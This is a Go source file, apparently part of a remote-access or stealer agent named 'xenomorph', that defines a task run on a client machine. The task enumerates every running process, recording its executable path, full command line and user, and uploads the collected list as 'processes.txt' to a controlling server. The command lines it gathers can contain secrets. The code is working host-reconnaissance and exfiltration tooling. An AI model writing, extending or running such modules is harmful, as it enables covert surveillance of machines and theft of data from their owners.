package tasks

import (
	"bytes"
	"fmt"
	"time"

	"github.com/codevault-llc/xenomorph/pkg/logger"
	"github.com/codevault-llc/xenomorph/pkg/server"
	"github.com/codevault-llc/xenomorph/pkg/types"
	"github.com/shirou/gopsutil/process"
	"go.uber.org/zap"
)

type ProcessTask struct {
	Client types.ClientController
}

func (u *ProcessTask) Name() string {
	return "ProcessTask"
}

func (u *ProcessTask) Run() error {
	logger.L().Info("Running ProcessTask")

	processes, err := process.Processes()
	if err != nil {
		logger.L().Error("Failed to get process list", zap.Error(err))
		return fmt.Errorf("failed to get process list: %w", err)
	}

	logger.L().Info("Found processes", zap.Int("count", len(processes)))

	var buf bytes.Buffer
	for _, p := range processes {
		pid := p.Pid

		name, _ := p.Name()
		exe, _ := p.Exe()
		status, _ := p.Status()
		ppid, _ := p.Ppid()
		cmdline, _ := p.Cmdline()
		username, _ := p.Username()
		createTime, _ := p.CreateTime()
		cpuPercent, _ := p.CPUPercent()
		//memInfo, _ := p.MemoryInfo()

		startTime := "N/A"
		if createTime > 0 {
			startTime = time.UnixMilli(createTime).Format(time.RFC3339)
		}

		logger.L().Info("Process info",
			zap.Int("pid", int(pid)),
			zap.String("name", name),
			zap.String("exe", exe),
			zap.String("status", status),
			zap.Int("ppid", int(ppid)),
			zap.String("cmdline", cmdline),
			zap.String("username", username),
			zap.String("start_time", startTime),
			zap.Float64("cpu_percent", cpuPercent),
		)

		buf.WriteString(fmt.Sprintf(
			"PID: %d\nName: %s\nExe: %s\nStatus: %s\nPPID: %d\nCmdline: %s\nUser: %s\nStart Time: %s\nCPU: %.2f%%\n\n",
			pid, name, exe, status, ppid, cmdline, username, startTime, cpuPercent,
		))
	}

	err = server.UploadFileFromBuffer(buf.Bytes(), "processes.txt", 0, u.Client)
	if err != nil {
		logger.L().Error("Failed to upload process info", zap.Error(err))
		return fmt.Errorf("failed to upload process info: %w", err)
	}

	logger.L().Info("Process information uploaded successfully")
	return nil
}
